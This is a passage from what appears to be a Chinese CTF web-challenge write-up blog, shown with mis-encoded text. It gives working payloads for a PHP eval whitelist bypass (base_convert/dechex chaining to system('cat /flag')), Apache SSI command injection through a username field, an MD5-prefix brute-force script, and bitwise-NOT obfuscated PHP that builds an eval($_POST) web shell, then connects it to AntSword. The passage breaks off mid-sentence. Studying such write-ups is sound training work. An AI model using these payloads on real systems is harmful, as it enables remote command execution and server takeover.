class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>å¾ˆæœ‰æ„æ€çš„é¢˜ï¼Œç…§ç€ç­”æ¡ˆ+chatåˆ†æäº†å¾ˆä¹…ï¼Œé•¿è§è¯†äº†ğŸ˜Š</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span> (strlen($content) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);<br>    &#125; <br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç›´æ¥è¿‡ï¼Œä¸€èˆ¬ä¸ä¼šè¶…è¿‡80ä¸ªå­—ç¬¦çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);<br>        &#125;<br>    &#125; <br></code></pre></td></tr></table></figure><p>ç»™äº†ä¸ªé»‘åå•å…ˆä¸ç®¡</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">preg<span class="hljs-constructor">_match_all(&#x27;<span class="hljs-operator">/</span>[<span class="hljs-params">a</span>-<span class="hljs-params">zA</span>-Z_\<span class="hljs-params">x7f</span>-\<span class="hljs-params">xff</span>][<span class="hljs-params">a</span>-<span class="hljs-params">zA</span>-Z_0-9\<span class="hljs-params">x7f</span>-\<span class="hljs-params">xff</span>]<span class="hljs-operator">*</span><span class="hljs-operator">/</span>&#x27;, $<span class="hljs-params">content</span>, $<span class="hljs-params">used_funcs</span>)</span>;  <br>    foreach ($used_funcs<span class="hljs-literal">[<span class="hljs-number">0</span>]</span> <span class="hljs-keyword">as</span> $func) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">in</span><span class="hljs-constructor">_array($<span class="hljs-params">func</span>, $<span class="hljs-params">whitelist</span>)</span>) &#123;<br>            die(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);<br>        &#125;<br>    &#125; <br></code></pre></td></tr></table></figure><p>åˆç»™äº†ä¸ªç™½åå•ï¼Œifé‡Œçš„æ„æ€ä¸ºå¾—æœ‰ç™½åå•é‡Œçš„å‡½æ•°</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-built_in">$used</span>_funcs[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-built_in">$func</span><br></code></pre></td></tr></table></figure><p>å¤ªæŠ½è±¡äº†ï¼Œå…ˆç†è§£ä¸ºæ£€ç´¢ç™½åå•<br>ä¸€ä¸ªçŸ¥è¯†ç‚¹æ˜¯phpä¸­å¯ä»¥æŠŠå‡½æ•°åé€šè¿‡å­—ç¬¦ä¸²çš„æ–¹å¼ä¼ é€’ç»™ä¸€ä¸ªå˜é‡ï¼Œç„¶åé€šè¿‡æ­¤å˜é‡åŠ¨æ€è°ƒç”¨å‡½æ•°ã€‚<br>ç†æƒ³ä¸­çš„ä¼ å‚æ˜¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=(<span class="hljs-variable">$_GET</span>[a])(<span class="hljs-variable">$_GET</span>[b])&amp;a=system&amp;b=<span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œçš„a,béƒ½ä¸æ˜¯ç™½åå•é‡Œçš„ï¼Œè¿™é‡Œæ›¿æ¢ä¸€ä¸‹</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">?c=(<span class="hljs-symbol">$</span>_GET[<span class="hljs-built_in">pi</span>])(<span class="hljs-symbol">$</span>_GET[<span class="hljs-built_in">abs</span>])&amp;<span class="hljs-built_in">pi</span>=<span class="hljs-keyword">system</span>&amp;<span class="hljs-built_in">abs</span>=cat /flag<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„_GETæ˜¯æ— æ³•è¿›è¡Œç›´æ¥æ›¿æ¢ï¼Œè€Œä¸”[]ä¹Ÿè¢«é»‘åå•è¿‡æ»¤äº†<br>çœ‹çœ‹ç™½åå•æœ‰ä»€ä¹ˆå¯ä»¥ç”¨çš„å‡½æ•°<br><strong>hex2bin()å‡½æ•°</strong><br>hex2bin()å‡½æ•°æŠŠåå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸ºASCiiå­—ç¬¦<br>æŠŠ_GETè½¬åŒ–ä¸ºåå…­è¿›åˆ¶<br><img src="/images/DJQB0VOJ373PVHM.png"><br>hex2bin(5f 47 45 54)å°±æ˜¯_GET,ä½†æ˜¯hex2bin()å‡½æ•°ä¹Ÿä¸æ˜¯ç™½åå•é‡Œé¢çš„ï¼Œè€Œä¸”è¿™é‡Œçš„5f 47 45 54ä¹Ÿä¸èƒ½ç›´æ¥å¡«å…¥ï¼Œè¿™é‡Œä¼šè¢«</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">preg<span class="hljs-constructor">_match_all(&#x27;<span class="hljs-operator">/</span>[<span class="hljs-params">a</span>-<span class="hljs-params">zA</span>-Z_\<span class="hljs-params">x7f</span>-\<span class="hljs-params">xff</span>][<span class="hljs-params">a</span>-<span class="hljs-params">zA</span>-Z_0-9\<span class="hljs-params">x7f</span>-\<span class="hljs-params">xff</span>]<span class="hljs-operator">*</span><span class="hljs-operator">/</span>&#x27;, $<span class="hljs-params">content</span>, $<span class="hljs-params">used_funcs</span>)</span>;  <br></code></pre></td></tr></table></figure><p>æ¥è¿›è¡Œç™½åå•çš„æ£€æµ‹<br>è¿™é‡Œçš„hex2bin()å‡½æ•°å¯ä»¥é€šè¿‡base_convert()å‡½æ•°æ¥è¿›è¡Œè½¬æ¢<br>base_convert()å‡½æ•°èƒ½å¤Ÿåœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—<br>base_convert(37907361743,10,36)ç­‰äºhex2bin(åˆ«é—®ä¸ºä»€ä¹ˆæ˜¯36è¿›åˆ¶ï¼Œé—®å°±æ˜¯è¿™ä¹ˆè½¬æ¢ä¼šç­‰äºhex2binğŸ˜Š)<br><img src="/images/ZIZM27JBL9XG2SZ5Y.png"></p><p>é‡Œé¢çš„5f 47 45 54è¦ç”¨dechex()å‡½æ•°å°†10è¿›åˆ¶è½¬æ¢ä¸º16è¿›åˆ¶çš„æ•°<br>dechex(1598506324),1598506324è½¬æ¢ä¸º16è¿›åˆ¶å°±æ˜¯5f 47 45 54<br><img src="/images/QEKBJT3PLILCFXS6L7BG.png"></p><p>payload</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">/?c=<span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>));(<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">pi</span>&#125;((<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">abs</span>&#125;)&amp;<span class="hljs-built_in">pi</span>=<span class="hljs-keyword">system</span>&amp;<span class="hljs-built_in">abs</span>=cat /flag<br></code></pre></td></tr></table></figure><p><img src="/images/B5YT537OKAX6WR7R5O.png"><br>flagå‡ºæ¥äº†ï¼Œå†è¯¦ç»†åˆ†æä¸‹<br>ä»å‰å¾€å</p><p>base_convert(37907361743,10,36)-&gt;hex2bin</p><p>dechex(1598506324)-&gt;5f 47 45 54</p><p>$pi&#x3D;hex2bin(5f 47 45 54)-&gt;$pi&#x3D;_GET</p><p>ç®¡é“ç¬¦;è¿æ¥</p><p>($$pi){pi}(($$pi){abs})</p><p>($_GET){pi}(($_GET){abs})</p><p>è¿™ä¸ªè¡¨è¾¾å¼å®é™…ä¸Šä¼šå°è¯•æ‰§è¡Œ$_GET(pi)($_GET(abs))</p><p>æ‰€ä»¥æ­¤æ—¶cçš„å€¼ä¸ºc&#x3D;_GET$_GET(pi)($_GET(abs))</p><p>åé¢æœ‰å¯¹piå’Œabsèµ‹å€¼ï¼Œå¸¦å…¥</p><p>c&#x3D;system(cat &#x2F;flag)</p><h2 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h2><p>å¥½ç®€å•ï¼Œå°±è—åœ¨æºä»£ç é‡Œ<br><img src="/images/IB0WVFS4XJ9N847G.png"></p><h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p>å¹¶ä¸æ˜¯sqlæ³¨å…¥å’Œxss<br>ä¸€å®šè¦æ³¨æ„é¢˜ç›®ç»™çš„æç¤º<br>è¾“å…¥usernameå’Œpasswordï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ä»¥GETæ–¹å¼å‘é€çš„<br>è·å–å…³é”®è¯cookie<br>å°è¯•ç”¨cookieç™»å½•<br><img src="/images/DAMXIM6X4N91NEI.png"><br>&amp;password&#x3D;123å¤šä½™äº†<br>å»æ‰è¯•è¯•<br><img src="/images/FZ806UV2QR1V9VG2.png"></p><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>sqlæ³¨ä¸å‡ºæ¥ï¼ŒæŸ¥çœ‹æºç ä¹Ÿæ²¡æœ‰ä»€ä¹ˆæœ‰æ•ˆçš„ä¿¡æ¯<br>ç”¨dirsearchæ‰«ä¸€æ‰«<br>æ²¡æœ‰æ‰«å‡ºä»€ä¹ˆä¸œè¥¿ï¼Œå¯èƒ½æ˜¯æˆ‘çš„dirsearchå¤ªä½çº§äº†<br>çœ‹äº†ä¸‹åˆ«äººçš„åšå®¢ï¼Œdirsearchæ‰«å‡ºäº†index.php.swp<br>æ‰¾åˆ°äº†æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ob_start</span>();<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_hash</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;<br><span class="hljs-variable">$random</span> = <span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)];<span class="hljs-comment">//Random 5 times</span><br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-variable">$random</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$content</span>); <br>&#125;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br>***<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;&#x27;</span> )<br>    &#123;<br>        <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;6d0bc1&#x27;</span>;<br>        <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$admin</span> == <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;<br>            <span class="hljs-variable">$file_shtml</span> = <span class="hljs-string">&quot;public/&quot;</span>.<span class="hljs-title function_ invoke__">get_hash</span>().<span class="hljs-string">&quot;.shtml&quot;</span>;<br>            <span class="hljs-variable">$shtml</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$file_shtml</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to open file!&quot;</span>);<br>            <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/h1&gt;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">***&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$shtml</span>,<span class="hljs-variable">$text</span>);<br>            <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$shtml</span>);<br>            ***<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[!] Header  error ...&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;<br>            <br>    &#125;<span class="hljs-keyword">else</span><br>    &#123;<br>***<br>    &#125;<br>***<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$admin</span> == <span class="hljs-built_in">substr</span>(<span class="hljs-built_in">md5</span>($_POST<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;password&#x27;</span>]</span>),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>))<br></code></pre></td></tr></table></figure><p>æ²¡æœ‰ç»•è¿‡æ–¹æ³•ï¼Œå†™ä¸€ä¸ªpythonè„šæœ¬</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scss">import hashlib<br><br>def <span class="hljs-built_in">crack</span>(pre):<br>    for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">9999999</span>):<br>        if (hashlib.<span class="hljs-built_in">md5</span>(<span class="hljs-built_in">str</span>(i).<span class="hljs-built_in">encode</span>(<span class="hljs-string">&quot;UTF-8&quot;</span>)).<span class="hljs-built_in">hexdigest</span>())[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == <span class="hljs-built_in">str</span>(pre):<br>            <span class="hljs-built_in">print</span>(i)<br>            break<br><br><br><span class="hljs-built_in">crack</span>(<span class="hljs-string">&quot;6d0bc1&quot;</span>)<br></code></pre></td></tr></table></figure><p>å¾—å‡ºä¸º2020666<br>è¾“å…¥</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">password</span>=<span class="hljs-number">2020666</span>&amp;username=admin<br></code></pre></td></tr></table></figure><p>é¡µé¢å‘å‡ºè­¦å‘Šè¯´æ˜å·²ç»é€šè¿‡</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl">$file_shtml = <span class="hljs-string">&quot;public/&quot;</span>.get_hash().<span class="hljs-string">&quot;.shtml&quot;</span>;<br>          $shtml = fopen($file_shtml, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to open file!&quot;</span>);<br>          $text = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">          ***</span><br><span class="hljs-string">          ***</span><br><span class="hljs-string">          &lt;h1&gt;Hello,&#x27;</span>.$_POST[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/h1&gt;</span><br><span class="hljs-string">          ***</span><br><span class="hljs-string">***&#x27;</span>;<br>          fwrite($shtml,$text);<br>          fclose($shtml);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„get_hash()å€¼æ˜¯ä¸å¯èƒ½æ±‚å‡ºæ¥çš„ï¼Œåªèƒ½æ‰¾å‡ºæ¥ï¼Œå†åœ¨é¡µé¢ä¸Šæ‰¾æ‰¾<br><img src="/images/MUW7PLXTC8KCQ5YHP.png"></p><p><img src="/images/NLRFZRXO510E.png"><br>çœ‹åˆ°client ipå°±æƒ³xffä¸€ä¸‹ï¼Œå¯æƒœxä¸äº†<br>è¿™é¢˜çš„æ€è·¯æ˜¯åˆ©ç”¨â€Apache SSIè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´â€<br><a href="https://www.cnblogs.com/yuzly/p/11226439.html">Apache SSI è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°</a><br>é¡µé¢å›æ˜¾äº†usernameï¼Œpasswordä¸èƒ½åŠ¨<br>çœ‹åˆ°.shtmlåç¼€ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ä¸€ä¸‹<br>å½“ç›®æ ‡æœåŠ¡å™¨å¼€å¯äº†SSIä¸CGIæ”¯æŒ,æˆ‘ä»¬å°±å¯ä»¥ä¸Šä¼ shtml,åˆ©ç”¨<code>&lt;!--#exec cmd=&quot;id&quot; --&gt;</code>è¯­æ³•æ‰§è¡Œå‘½ä»¤ã€‚<br>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=<span class="hljs-comment">&lt;!--#exec cmd=&quot;ls&quot; --&gt;</span>&amp;password=2020666<br></code></pre></td></tr></table></figure><p>è¿›å…¥æ–°ç”Ÿæˆçš„urlæŸ¥çœ‹<br><img src="/images/ZJ4P7M6GGO.png"><br>è¿™ä¹ˆå¤šçš„é“¾æ¥ï¼Œè¦è¯•åˆ°çŒ´å¹´é©¬æœˆ<br>å»æ ¹ç›®å½•çœ‹çœ‹<br>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=<span class="hljs-comment">&lt;!--#exec cmd=&quot;ls /&quot; --&gt;</span>&amp;password=2020666<br></code></pre></td></tr></table></figure><p><img src="/images/EP83OM9ZY8K5GK.png"><br>æ²¡æœ‰ï¼Œé‚£ä¸Šä¸€çº§çœ‹çœ‹<br>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=<span class="hljs-comment">&lt;!--#exec cmd=&quot;ls ../&quot; --&gt;</span>&amp;password=2020666<br></code></pre></td></tr></table></figure><p><img src="/images/MHS82ETVEKT1RC6.png"><br>çœ‹åˆ°ä½ç½®ç›´æ¥cat<br>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=<span class="hljs-comment">&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;</span>&amp;password=2020666<br></code></pre></td></tr></table></figure><p><img src="/images/CVZTGYF5UOP7U2YGKY.png"></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</h2><p>è¿™é¢˜æºç éå¸¸ç®€å•ï¼Œå°±æ˜¯è¦ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä¸èƒ½ä½¿ç”¨æ¢è¡Œç¬¦æ¥ç»•è¿‡ï¼Œè¦ä½¿ç”¨phpå¼‚æˆ–æ“ä½œå³å¯ç»•è¿‡æˆ–é€šè¿‡urlç¼–ç ç»•è¿‡<br>ä½†æ˜¯ã€‚ã€‚ã€‚<br>è¿˜æ˜¯æ²¡æœ‰è¿™ä¹ˆç®€å•ï¼Œæœ¬é¢˜ä¸»è¦å†…å®¹æ˜¯disable_functionç¦ç”¨äº†å¤§é‡çš„å‡½æ•°å¯¼è‡´shellä¸Šä¼ æˆåŠŸä½†æ— æ³•ä½¿ç”¨çš„æƒ…å†µå‡ºç°ä½¿å¾—éš¾åº¦å¤§å¤§æé«˜<br>å…ˆå–åç»•è¿‡<br>å–åæ“ä½œå¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;phpinfo&#x27;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$a</span>);<br><br>&gt;<br>payload<br>?code=(~%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">99</span>%<span class="hljs-number">90</span>)();<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹phpinfo</p><p>æ“ä¸€ä¸ªshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;assert&#x27;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-string">&#x27;(eval($_POST[a]))&#x27;</span>;<br><span class="hljs-variable">$d</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$d</span>;<br><span class="hljs-meta">?&gt;</span><br>åœ¨PHPä¸­ï¼Œ~ æ˜¯æŒ‰ä½å–åè¿ç®—ç¬¦ï¼Œè€Œç”¨urlç¼–ç æ˜¯é¿å…ä¸å¯è§å­—ç¬¦<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;D&quot;</span>^<span class="hljs-string">&quot;C&quot;</span>                  å¼‚æˆ–<br><span class="hljs-comment">//$a=&#x27; </span><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&quot;B&quot;</span>);        å–å<br><span class="hljs-comment">//$a=%BB                ç”±äºå–åç»“æœæ˜¯ä¸€ä¸ªä¸å¯è§çš„å­—ç¬¦ã€‚æ‰€ä»¥æˆ‘ä»¬é€šè¿‡URLç¼–ç è¾“å‡ºã€‚æµè§ˆå™¨ä¼šè‡ªåŠ¨è§£ç ã€‚~&quot;B&quot;=~%BB</span><br><span class="hljs-comment">//ä¸å¤ªæ˜ç™½ä¸ºä»€ä¹ˆè¦ç”¨assert</span><br></code></pre></td></tr></table></figure><p><img src="/images/IUW8YX16KKFF6HS.png"><br>é€šè¿‡phpinfo()é¡µé¢å¯çŸ¥<br><img src="/images/I1AISR2SJBF6ZWJ4.png"><br>åœ¨phpinfo()é¡µé¢å¯ä»¥å‘ç°ç¦ç”¨äº†éå¸¸å¤šçš„å‡½æ•°ï¼Œå…¶ä¸­åŒ…æ‹¬systemã€execã€shell_execç­‰å…³é”®æ‰§è¡Œå‡½æ•°<br>æœ‰shelläº†å°±è¿ä¸‹èšå‰‘<br>è¿æ¥å‘ç°æ 